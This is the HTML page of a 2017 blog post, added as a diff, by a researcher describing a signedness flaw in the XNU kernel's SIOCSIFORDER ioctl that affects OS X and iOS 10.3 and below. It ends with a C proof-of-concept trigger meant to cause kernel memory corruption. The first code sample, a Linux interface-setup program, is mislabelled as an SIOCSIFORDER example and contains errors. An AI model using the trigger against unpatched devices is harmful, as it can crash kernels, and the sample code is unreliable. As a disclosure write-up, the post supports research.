@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SIOCSIFORDER count memory corruption bug | Charles Muiruri</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="This post is about a bug I found in the xnu kernel affecting the  SIOCSIFORDER call. The bug  affected  both OS X and iOS with the vulnerable piece of code. In iOS it affects iOS 10.3  and below so ob">
+<meta name="keywords" content="OS X&#x2F;iOS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SIOCSIFORDER count memory corruption bug">
+<meta property="og:url" content="http://icrackthecode.github.io/2017/05/17/SIOCSIFORDER-count-out-of-bounds/index.html">
+<meta property="og:site_name" content="Charles Muiruri">
+<meta property="og:description" content="This post is about a bug I found in the xnu kernel affecting the  SIOCSIFORDER call. The bug  affected  both OS X and iOS with the vulnerable piece of code. In iOS it affects iOS 10.3  and below so ob">
+<meta property="og:updated_time" content="2017-05-17T07:48:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SIOCSIFORDER count memory corruption bug">
+<meta name="twitter:description" content="This post is about a bug I found in the xnu kernel affecting the  SIOCSIFORDER call. The bug  affected  both OS X and iOS with the vulnerable piece of code. In iOS it affects iOS 10.3  and below so ob">
+  
+    <link rel="alternate" href="/atom.xml" title="Charles Muiruri" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <h1 id="logo-wrap">
+                <a href="/" id="logo">
+                    Charles Muiruri
+                </a>
+            </h1>
+            
+                <h2 id="subtitle-wrap">
+                    <a href="/" id="subtitle">
+                        EXPLOIT DEVELOPMENT ||  I BREAK TO BUILD
+                    </a>
+                </h2>
+                
+        </div>
+        <div id="header-inner" class="inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <a class="main-nav-link" href="/">
+                        Home
+                    </a>
+                    
+                    <a class="main-nav-link" href="/archives">
+                        Archives
+                    </a>
+                    
+            </nav>
+            <nav id="sub-nav">
+                <a id="nav-github-link" class="nav-icon" href="https://github.com/icrackthecode"></a>
+                <a id="nav-linkedin-link" class="nav-icon" href=""></a>
+                <a id="nav-twitter-link" class="nav-icon" href="https://twitter.com/icrackthecode"></a>
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+                    
+                        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://icrackthecode.github.io"></form>
+            </div>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SIOCSIFORDER-count-out-of-bounds" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/05/17/SIOCSIFORDER-count-out-of-bounds/" class="article-date">
+  <time datetime="2017-05-17T07:48:44.000Z" itemprop="datePublished">2017-05-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SIOCSIFORDER count memory corruption bug
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>This post is about a bug I found in the xnu kernel affecting the  <b>SIOCSIFORDER </b>call. The bug  affected  both OS X and iOS with the vulnerable piece of code. In iOS it affects iOS 10.3  and below so obviously it has been fixed in the  lastest version of iOS.<br>I discovered the bug, hence given the bug id <b>663014551</b>, however upon reporting I was told it was a duplicate so i guess it was a rediscovery 😒 .</p>
+<p>Anyways , since it was my first bug report to apple I thought it was worth a blog post.</p>
+<p>Lets begin 😃 . </p>
+<a id="more"></a>
+<h3 id="So-what’s-SIOCSIFORDER"><a href="#So-what’s-SIOCSIFORDER" class="headerlink" title="So what’s SIOCSIFORDER?"></a>So what’s SIOCSIFORDER?</h3><p>SIOCSIFORDER is often used in networking and is quite helpful/useful when creating an ip address. It has been implemented in many unix systems from linux kernel to XNU kernel.<br>Below is an example of how to implement SIOCSIFORDER in c and the best example would be its implementation in creating a socket. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></div><div class="line"><span class="comment">#include &lt;net/if.h&gt;</span></div><div class="line"><span class="comment">#include &lt;net/if_arp.h&gt;</span></div><div class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></div><div class="line"><span class="comment">#include &lt;linux/sockios.h&gt;</span></div><div class="line"><span class="comment">#include &lt;errno.h&gt;</span></div><div class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></div><div class="line"><span class="comment">#include &lt;net/route.h&gt;</span></div><div class="line"><span class="comment">#if defined(__GLIBC__) &amp;&amp; __GLIBC__ &gt;=2 &amp;&amp; __GLIBC_MINOR__ &gt;= 1</span></div><div class="line"><span class="comment">#include &lt;netpacket/packet.h&gt;</span></div><div class="line"><span class="comment">#include &lt;net/ethernet.h&gt;</span></div><div class="line"><span class="comment">#else</span></div><div class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></div><div class="line"><span class="comment">#include &lt;netinet/if_ether.h&gt;</span></div><div class="line"><span class="comment">#endif</span></div><div class="line">/**</div><div class="line">* Create socket <span class="keyword">function</span></div><div class="line">*/</div><div class="line">int <span class="function"><span class="title">create_socket</span></span>() &#123;</div><div class="line">  </div><div class="line">  int sockfd = 0;</div><div class="line">  </div><div class="line">  sockfd = socket(AF_INET, SOCK_DGRAM, 0);</div><div class="line">  <span class="keyword">if</span>(sockfd == -1)&#123;</div><div class="line">    fprintf(stderr, <span class="string">"Could not get socket.\n"</span>);</div><div class="line">    <span class="built_in">return</span> -1;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="built_in">return</span> sockfd;</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line">/**</div><div class="line">* Generic ioctrlcall to reduce code size</div><div class="line">*/</div><div class="line">int generic_ioctrlcall(int sockfd, u_long *flags, struct ifreq *ifr) &#123;</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (ioctl(sockfd, (long unsigned int)flags, &amp;ifr) &lt; 0) &#123;</div><div class="line">    fprintf(stderr, <span class="string">"ioctl: %s\n"</span>, (char *)flags);</div><div class="line">    <span class="built_in">return</span> -1;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">return</span> 1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/**</div><div class="line">* Set route with metric 100</div><div class="line">*/</div><div class="line">int set_route(int sockfd, char *gateway_addr,  struct sockaddr_in *addr) &#123;</div><div class="line">  </div><div class="line">  struct rtentry route;</div><div class="line">  int err = 0;</div><div class="line">  memset(&amp;route, 0, sizeof(route));</div><div class="line">  addr = (struct sockaddr_in*) &amp;route.rt_gateway;</div><div class="line">  addr-&gt;sin_family = AF_INET;</div><div class="line">  addr-&gt;sin_addr.s_addr = inet_addr(gateway_addr);</div><div class="line">  addr = (struct sockaddr_in*) &amp;route.rt_dst;</div><div class="line">  addr-&gt;sin_family = AF_INET;</div><div class="line">  addr-&gt;sin_addr.s_addr = inet_addr(<span class="string">"0.0.0.0"</span>);</div><div class="line">  addr = (struct sockaddr_in*) &amp;route.rt_genmask;</div><div class="line">  addr-&gt;sin_family = AF_INET;</div><div class="line">  addr-&gt;sin_addr.s_addr = inet_addr(<span class="string">"0.0.0.0"</span>);</div><div class="line">  route.rt_flags = RTF_UP | RTF_GATEWAY;</div><div class="line">  route.rt_metric = 100;</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> ((err = ioctl(sockfd, SIOCADDRT, &amp;route)) &lt; 0) &#123;</div><div class="line">    fprintf(stderr, <span class="string">"ioctl: %s\n"</span>, (char *)flags);</div><div class="line">    <span class="built_in">return</span> -1;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">return</span> 1;</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line">/**</div><div class="line">* Set ip <span class="keyword">function</span></div><div class="line">*/</div><div class="line">int set_ip(char *iface_name, char *ip_addr, char *gateway_addr)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span>(!iface_name)</div><div class="line">    <span class="built_in">return</span> -1;</div><div class="line">    </div><div class="line">  struct ifreq ifr;</div><div class="line">  struct sockaddr_in sin;</div><div class="line">  int sockfd = create_socket();</div><div class="line">  </div><div class="line">  sin.sin_family = AF_INET;</div><div class="line">  </div><div class="line">  // Convert IP from numbers and dots to binary notation</div><div class="line">  inet_aton(ip_addr,&amp;sin.sin_addr.s_addr);</div><div class="line">  </div><div class="line">  /* get interface name */</div><div class="line">  strncpy(ifr.ifr_name, iface_name, IFNAMSIZ);</div><div class="line">  </div><div class="line">  /* Read interface flags */</div><div class="line">  generic_ioctrlcall(sockfd, (u_long *)<span class="string">"SIOCGIFFLAGS"</span>, &amp;ifr);</div><div class="line">  </div><div class="line">  /*</div><div class="line">  * Expected <span class="keyword">in</span> &lt;net/if.h&gt; according to</div><div class="line">  * <span class="string">"UNIX Network Programming"</span>.</div><div class="line">  */</div><div class="line">  <span class="comment">#ifdef ifr_flags</span></div><div class="line">  <span class="comment"># define IRFFLAGS       ifr_flags</span></div><div class="line">  <span class="comment">#else   /* Present on kFreeBSD */</span></div><div class="line">  <span class="comment"># define IRFFLAGS       ifr_flagshigh</span></div><div class="line">  <span class="comment">#endif</span></div><div class="line">  </div><div class="line">  // If interface is down, bring it up</div><div class="line">  <span class="keyword">if</span> (ifr.IRFFLAGS | ~(IFF_UP)) &#123;</div><div class="line">    ifr.IRFFLAGS |= IFF_UP;</div><div class="line">    generic_ioctrlcall(sockfd, (u_long *)<span class="string">"SIOCSIFFLAGS"</span>, &amp;ifr);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  // Set route</div><div class="line">  set_route(sockfd, gateway_addr,  &amp;sin);</div><div class="line">  </div><div class="line">  memcpy(&amp;ifr.ifr_addr, &amp;sin, sizeof(struct sockaddr)); </div><div class="line">  </div><div class="line">  // Set interface address</div><div class="line">  <span class="keyword">if</span> (ioctl(sockfd, SIOCSIFADDR, &amp;ifr) &lt; 0) &#123;</div><div class="line">    fprintf(stderr, <span class="string">"Cannot set IP address. "</span>);</div><div class="line">    perror(ifr.ifr_name);</div><div class="line">    <span class="built_in">return</span> -1;</div><div class="line">  &#125;             </div><div class="line">  <span class="comment">#undef IRFFLAGS</span></div><div class="line">  </div><div class="line">  <span class="built_in">return</span> 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void <span class="function"><span class="title">usage</span></span>()</div><div class="line">&#123;</div><div class="line">  const char *usage = &#123;</div><div class="line">    <span class="string">"./set_ip [interface] [ip address] [gateway address]\n"</span></div><div class="line">  &#125;;</div><div class="line">  fprintf(stderr,<span class="string">"%s"</span>,usage);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span>(argc &lt; 3)&#123;</div><div class="line">    usage();</div><div class="line">    <span class="built_in">return</span> -1;</div><div class="line">  &#125;<span class="keyword">else</span> &#123;</div><div class="line">    </div><div class="line">    set_ip(argv[1],argv[2], argv[3]);</div><div class="line">    </div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="Bug-discovery"><a href="#Bug-discovery" class="headerlink" title="Bug discovery"></a>Bug discovery</h3><p> Earlier this year, Ian Beer reported a bunch of vulnerabilities to apple that affeted the IOKit among them were SIOCSIFORDER related bugs.<br>Around the same time I was looking for bugs in the same area. I happened to come across a specific code section in the XNU Kernel that caught my eyes.</p>
+<p>Below is the XNU code section for SIOCSIFORDER</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> SIOCSIFORDER: &#123;	</div><div class="line">		struct if_order *ifo = (struct if_order *)(void *)data;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ((int)ifo-&gt;ifo_count &gt; if_index) &#123;</div><div class="line">			error = EINVAL;</div><div class="line">			<span class="built_in">break</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		size_t length =	(ifo-&gt;ifo_count * sizeof(u_int32_t));</div><div class="line">		<span class="keyword">if</span> (length &gt; 0) &#123;</div><div class="line">			<span class="keyword">if</span> (ifo-&gt;ifo_ordered_indices == USER_ADDR_NULL) &#123;</div><div class="line">				error = EINVAL;</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			&#125;</div><div class="line">			ordered_indices = _MALLOC(length, M_NECP, M_WAITOK);</div><div class="line">			<span class="keyword">if</span> (ordered_indices == NULL) &#123;</div><div class="line">				error = ENOMEM;</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			error = copyin(ifo-&gt;ifo_ordered_indices,</div><div class="line">			    ordered_indices, length);</div><div class="line">			<span class="keyword">if</span> (error != 0) &#123;</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		error = ifnet_reset_order(ordered_indices, ifo-&gt;ifo_count);</div><div class="line">		<span class="built_in">break</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p> Looking at this piece of code i asked myself what could I control from the structure. It was pretty clear that I could control  <code>ifo_count</code>.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct if_order &#123;</div><div class="line">	u_int32_t			ifo_count; &lt;----This I can control</div><div class="line">	u_int32_t			ifo_reserved;</div><div class="line">	mach_vm_address_t	ifo_ordered_indices; </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>The next question was are there any boundary and type casting checks that are related with the specific element <code>u_int32_t  ifo_count</code></p>
+<h3 id="The-logical-flaw"><a href="#The-logical-flaw" class="headerlink" title="The logical flaw"></a>The logical flaw</h3><p> <code>if ((int)ifo-&gt;ifo_count &gt; if_index)</code> is captured as an int, whilst its of type u_int32_t<br> hence this check is not sufficient </p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((int)ifo-&gt;ifo_count &gt; if_index) &#123;</div><div class="line">	error = EINVAL;</div><div class="line">	<span class="built_in">break</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Take a look at the piece of code below, can you spot the problem ?</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (length &gt; 0) &#123;</div><div class="line">		<span class="keyword">if</span> (ifo-&gt;ifo_ordered_indices == USER_ADDR_NULL) &#123;</div><div class="line">			error = EINVAL;</div><div class="line">			<span class="built_in">break</span>;</div><div class="line">		&#125;</div><div class="line">		ordered_indices = _MALLOC(length, M_NECP, M_WAITOK);</div><div class="line">		<span class="keyword">if</span> (ordered_indices == NULL) &#123;</div><div class="line">			error = ENOMEM;</div><div class="line">			<span class="built_in">break</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		error = copyin(ifo-&gt;ifo_ordered_indices,</div><div class="line">		    ordered_indices, length);</div><div class="line">		<span class="keyword">if</span> (error != 0) &#123;</div><div class="line">			<span class="built_in">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<h3 id="The-trigger"><a href="#The-trigger" class="headerlink" title="The trigger"></a>The trigger</h3><p>Taking a look at <code>ordered_indices = _MALLOC(length, M_NECP, M_WAITOK);</code></p>
+<p>It’s quite evident that doing a memory alloaction with an undersired length would lead to a memory corruption which if well implementaion could lead to a kernel leak.</p>
+<h3 id="Code-Sample-with-trigger"><a href="#Code-Sample-with-trigger" class="headerlink" title="Code Sample with trigger"></a>Code Sample with trigger</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># include &lt;CoreFoundation/CoreFoundation.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line"><span class="comment">#include &lt;assert.h&gt;</span></div><div class="line"></div><div class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></div><div class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></div><div class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></div><div class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">struct if_order &#123;</div><div class="line">    u_int32_t			ifo_count;</div><div class="line">    u_int32_t			ifo_reserved;</div><div class="line">    mach_vm_address_t	ifo_ordered_indices; /* array of u_int32_t */</div><div class="line">&#125;;</div><div class="line"><span class="comment">#define	SIOCSIFORDER	_IOWR('i', 178, struct if_order)</span></div><div class="line"></div><div class="line">void <span class="function"><span class="title">exploit</span></span>()&#123;</div><div class="line">  </div><div class="line">            </div><div class="line">    uint32_t data[] = &#123;0x70001234&#125;;</div><div class="line">    struct if_order ifo;</div><div class="line">    ifo.ifo_count = 1000000000000000; // Cause corruption</div><div class="line">    ifo.ifo_reserved = 0;</div><div class="line">    ifo.ifo_ordered_indices = (mach_vm_address_t)data;</div><div class="line">    </div><div class="line">    </div><div class="line">    int evil_socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</div><div class="line">    int result = ioctl(evil_socket,SIOCSIFORDER,&amp;ifo);</div><div class="line">    assert(result==KERN_SUCCESS);</div><div class="line">     </div><div class="line">    </div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">`</div></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://icrackthecode.github.io/2017/05/17/SIOCSIFORDER-count-out-of-bounds/" data-id="cj2sorsza00008gn6eife5wl1" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OS-X-iOS/">OS X/iOS</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/OS-X-iOS/">OS X/iOS</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/OS-X-iOS/" style="font-size: 10px;">OS X/iOS</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/05/17/SIOCSIFORDER-count-out-of-bounds/">SIOCSIFORDER count memory corruption bug</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Charles Muiruri<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
